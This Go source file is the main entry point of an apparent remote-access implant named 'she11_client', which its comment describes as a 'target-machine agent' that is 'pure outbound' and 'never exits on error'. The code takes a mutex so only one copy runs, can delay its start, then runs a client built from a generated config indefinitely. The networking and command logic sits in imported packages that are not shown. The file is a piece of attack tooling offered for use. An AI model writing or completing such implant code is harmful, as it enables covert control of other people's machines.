// Command she11_client is the target-machine agent: no runtime parameters,
// no runtime files, pure outbound, never exits on error.
package main

import (
	"os"
	"time"

	"she11/src/client"
	"she11/src/shared/gen"
	"she11/src/shared/lock"
)

func main() {
	cfg := gen.Config

	release, err := lock.Acquire(cfg.MutexName)
	if err == lock.ErrHeld {
		os.Exit(9)
	}
	defer release()

	if cfg.DelayStartSec > 0 {
		time.Sleep(time.Duration(cfg.DelayStartSec) * time.Second)
	}

	c, err := client.New(cfg)
	if err != nil {
		os.Exit(2)
	}
	c.Run() // never returns
}
